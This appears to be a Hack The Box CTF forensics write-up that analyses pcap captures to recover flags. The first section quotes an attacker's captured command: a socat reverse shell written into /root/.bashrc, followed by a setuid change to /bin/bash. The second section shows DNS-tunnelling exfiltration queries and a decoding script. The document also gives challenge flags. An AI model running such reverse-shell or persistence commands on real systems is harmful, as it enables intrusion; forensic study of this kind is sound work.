# **Wrong Spooky Season**
```
"I told them it was too soon and in the wrong season to deploy such a website, but they assured me that theming it properly would be enough to stop the ghosts from haunting us.
I was wrong." Now there is an internal breach in the `Spooky Network` and you need to find out what happened. 
Analyze the the network traffic and find how the scary ghosts got in and what they did.
```

First challenge, they give us one pcap file. There're two ways you can solve this.

*Unintended solution:*

You can simply use `strings` to see what inside the pcap file.

```
┌──(kali㉿devilmachine)-[/mnt/d/WSL_LAB/Workplace/htb-boo/forensics_wrong_spooky_season]
└─$ strings *.pcap
...
echo 'socat TCP:192.168.1.180:1337 EXEC:sh' > /root/.bashrc && echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null && chmod +s /bin/bash
VDc0c
'"FO
'"FO
I;r?
ls -lha
'"FO
'"FO
I;rtotal 20K
drwxr-xr-x 1 root root 4.0K Oct 10 17:28 .
drwxr-xr-x 1 root root 4.0K Oct 10 17:28 ..
```

So there is a base64 encoded string. Reverse it then decode, we have the flag.

*Intended solution:*

Open the pcap file then follow TCP stream to the last. Here is the result:

~pic~


## FLAG: HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}
___

# **Trick or Breach**
```
Our company has been working on a secret project for almost a year. None knows about the subject, although rumor is that it is about an old Halloween legend where an old witch in the woods invented a potion to bring pumpkins to life, but in a more up-to-date approach.
Unfortunately, we learned that malicious actors accessed our network in a massive cyber attack. Our security team found that the hack had occurred when a group of children came into the office's security external room for trick or treat.
One of the children was found to be a paid actor and managed to insert a USB into one of the security personnel's computers, which allowed the hackers to gain access to the company's systems.
We only have a network capture during the time of the incident. Can you find out if they stole the secret project?
```

We have another pcap file in this challenge. Let's see what inside:

~pic~

If you notice, there're some strange URLs that were captured during the transfering data. This is DNS Tunneling - one of the real world attack. Those strange URLs that you can see in wireshark were encoded or encrypted. Let's find out by extracting those URLs.

I filtered the query IP the copied whole data to a file

~pic~

```
1	0.000000	192.168.1.10	147.182.172.189	DNS	126	Standard query 0xa49f A 504b0304140008080800a52c47550000000000000000000000.pumpkincorp.com
3	1.062969	192.168.1.10	147.182.172.189	DNS	126	Standard query 0xdd23 A 0018000000786c2f64726177696e67732f64726177696e6731.pumpkincorp.com
5	2.069426	192.168.1.10	147.182.172.189	DNS	126	Standard query 0xcf3f A 2e786d6c9dd05d6ec2300c07f013ec0e55de695a181343145e.pumpkincorp.com
7	3.155776	192.168.1.10	147.182.172.189	DNS	126	Standard query 0xb53f A d04e300ee0256e1b918fca0ea3dc7ed14a36697b011e6dcb3f.pumpkincorp.com
9	4.236338	192.168.1.10	147.182.172.189	DNS	126	Standard query 0x6195 A f9efcd6e74b6f84462137c23eab212057a15b4f15d230eef6f.pumpkincorp.com
11	5.254457	192.168.1.10	147.182.172.189	DNS	126	Standard query 0x5634 A b395283882d76083c7465c90c56efbb41935adcfbca722ed7b.pumpkincorp.com
13	6.298151	192.168.1.10	147.182.172.189	DNS	126	Standard query 0xacfd A 5ea7b2117d8cc35a4a563d3ae0320ce8d3b40de420a6923aa9.pumpkincorp.com
15	7.319849	192.168.1.10	147.182.172.189	DNS	126	Standard query 0x8482 A 09ce497656ceabea45f240089a7bc4b89f26e2eac1039a03e3.pumpkincorp.com
```

Then I wrote this script to extract the encoded/encrypted parts.

```py
f = open('qry.txt','r').readlines()
data = [i.split()[-1].replace('.pumpkincorp.com','') for i in f]
data = "".join(data)
wb = bytes.fromhex("".join(data))
wf = open('sus','wb')
wf.write(wb)
```
## FLAG: HTB{M4g1c_c4nn0t_pr3v3nt_d4t4_br34ch}
___
# **Halloween Invitation**
```
An email notification pops up. It's from your theater group. Someone decided to throw a party. The invitation looks awesome, but there is something suspicious about this document. Maybe you should take a look before you rent your banana costume.
```





